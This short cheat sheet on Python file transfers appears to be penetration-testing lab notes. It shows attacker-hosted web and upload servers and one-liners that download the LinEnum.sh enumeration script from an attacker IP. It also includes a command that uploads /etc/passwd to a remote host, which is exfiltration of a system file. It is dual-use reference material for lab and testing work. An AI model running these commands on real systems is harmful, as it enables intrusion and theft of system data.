# Python File Transfers

## Web Servers (Attacker-Hosted)

```bash
python3 -m http.server 80
python2.7 -m SimpleHTTPServer 8000
```

## Upload Server

```bash
pip3 install uploadserver
python3 -m uploadserver
# Upload page at /upload on port 8000
```

With HTTPS (self-signed cert):

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

---

## Download One-Liners

```bash
# Python 2
python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'
```

## Upload One-Liner

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
